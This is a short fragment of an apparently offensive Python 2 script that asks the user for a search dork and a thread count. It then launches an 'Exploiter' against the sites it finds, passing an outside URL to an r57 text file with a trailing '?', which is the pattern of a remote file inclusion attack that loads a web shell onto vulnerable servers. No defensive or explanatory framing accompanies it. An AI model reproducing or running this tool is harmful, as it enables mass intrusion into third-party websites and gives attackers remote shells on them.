...
dorkinput = raw_input("Enter Your Dork : ")
threadinput = raw_input("Enter Your Thread Number : ")
...
try:
    exploit = Exploiter()
    exploit.main(dorkinput,int(threadinput),"http://www.xfocus.net/tools/200608/r57.txt?")
except IndexError:
